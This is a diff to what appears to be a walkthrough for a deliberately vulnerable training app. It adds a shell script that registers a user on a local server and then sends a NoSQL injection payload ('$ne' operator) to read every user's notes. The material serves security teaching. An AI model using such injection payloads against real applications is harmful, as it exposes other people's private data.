@@ -1010,6 +1010,19 @@ Application is using MongoDB to handle user notes your goal is to read a note wi
 {"username":{"$ne":""}}
 ```
 
+Here's a shell script to do it in one shot:
+```
+#!/bin/sh
+rand=$(date | (shasum || sha1sum) | cut -c1-6)
+authToken=$(curl -s http://localhost:9000/register \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    -d "username=user$rand&email=nobody@example.com&password=testpass123")
+
+curl -gisS http://localhost:9000/mongodb-notes/show-notes \
+    -H "Cookie: authToken=$authToken" \
+    --json '{"username":{"$ne":""}}'
+```
+
 ### Vulnerable code
 
 **Request method, endpoint, parameter**
